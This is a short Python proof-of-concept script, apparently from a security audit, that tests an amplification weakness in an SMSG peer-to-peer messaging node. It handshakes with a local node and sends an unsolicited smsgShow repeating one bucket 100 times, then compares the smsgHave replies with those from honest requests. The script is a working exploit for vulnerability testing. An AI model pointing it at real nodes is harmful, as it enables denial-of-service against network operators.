# SEC-19: smsgShow amplification. Usage: show.py <p2p-port> <bucket-time>
# 1. unsolicited: before any smsgInv, ask for <bucket-time> 100 times in one smsgShow;
# 2. honest: complete the SMSG handshake, wait for the node's smsgInv and ask once
#    for the buckets it listed;
# 3. repeat: send the same honest smsgShow again.
# Prints the number of smsgHave replies for each step.
import socket, struct, time, hashlib, sys, os
MAGIC = bytes([0xfc, 0xc1, 0xb7, 0xdc])

def msg(cmd, payload=b""):
    chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return MAGIC + cmd.encode().ljust(12, b"\0") + struct.pack("<I", len(payload)) + chk + payload

def addr():
    return struct.pack("<Q", 0) + b"\0" * 10 + b"\xff\xff" + bytes([127, 0, 0, 1]) + struct.pack(">H", 0)

def compact(n):
    if n < 0xfd:
        return bytes([n])
    return b"\xfd" + struct.pack("<H", n)

def vec(data):
    return compact(len(data)) + data

class Peer:
    def __init__(self, port):
        self.s = socket.create_connection(("127.0.0.1", port), timeout=5)
        self.s.settimeout(0.5)
        self.buf = b""

    def send(self, cmd, payload=b""):
        self.s.sendall(msg(cmd, payload))

    def read(self, seconds, stop=None):
        """Collect (cmd, payload) for up to `seconds`, or until stop(cmd) is true."""
        out, deadline = [], time.time() + seconds
        while time.time() < deadline:
            try:
                d = self.s.recv(65536)
            except socket.timeout:
                d = None
            if d == b"":
                break
            if d:
                self.buf += d
            while len(self.buf) >= 24:
                ln = struct.unpack("<I", self.buf[16:20])[0]
                if len(self.buf) < 24 + ln:
                    break
                cmd = self.buf[4:16].rstrip(b"\0").decode()
                out.append((cmd, self.buf[24:24 + ln]))
                self.buf = self.buf[24 + ln:]
                if cmd == "smsgPing":
                    self.send("smsgPong")
                if cmd == "ping":
                    self.send("pong", out[-1][1])
                if stop and stop(cmd):
                    return out
        return out

def show(times):
    return vec(struct.pack("<I", len(times)) + b"".join(struct.pack("<q", t) for t in times))

def count(msgs, cmd):
    return sum(1 for c, _ in msgs if c == cmd)

port, bucket = int(sys.argv[1]), int(sys.argv[2])
p = Peer(port)
ver = struct.pack("<iQq", 70234, 0, int(time.time())) + addr() + addr() + os.urandom(8) + b"\x06/poc:/" + struct.pack("<i", 1) + b"\x01"
p.send("version", ver)
p.read(10, stop=lambda c: c == "verack")
p.send("verack")

# 1. Unsolicited, the same bucket 100 times. The node has not sent us an smsgInv.
p.send("smsgShow", show([bucket] * 100))
first = p.read(6)
unsolicited = count(first, "smsgHave")

# 2. Honest: smsgPing is answered by read(); the node then sends its smsgInv,
#    possibly already inside the window above.
inv = [pl for c, pl in first if c == "smsgInv"]
if not inv:
    inv = [pl for c, pl in p.read(20, stop=lambda c: c == "smsgInv") if c == "smsgInv"]
times = []
if inv:
    data = inv[-1]
    off = 3 if data[0] == 0xfd else 1           # vector length prefix
    n = struct.unpack("<I", data[off:off + 4])[0]
    for i in range(n):
        times.append(struct.unpack("<q", data[off + 4 + 16 * i: off + 12 + 16 * i])[0])
honest = 0
repeat = 0
if times:
    p.send("smsgShow", show(times))
    honest = count(p.read(6), "smsgHave")
    p.send("smsgShow", show(times))
    repeat = count(p.read(6), "smsgHave")
print("advertised:%d unsolicited:%d honest:%d repeat:%d" % (len(times), unsolicited, honest, repeat))
p.s.close()
